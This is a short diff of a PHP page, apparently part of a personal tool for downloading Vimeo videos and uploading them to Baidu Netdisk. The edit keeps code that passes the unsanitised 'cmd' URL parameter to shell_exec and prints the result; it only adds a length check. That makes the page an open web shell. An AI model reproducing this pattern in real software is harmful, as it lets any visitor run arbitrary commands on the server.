@@ -84,7 +84,8 @@ body{
 <div class="box">
 <?php
 $cmd = $_GET['cmd'];
-echo shell_exec("$cmd"); //命令行
+$lenthcmd=strlen($cmd); //获取cmd长度
+if ($lenthcmd>1) { echo shell_exec("$cmd");} //命令行
 	
 $A=strtotime("now");
 if(file_exists("vimeodl1上传百度网盘.txt")){ 
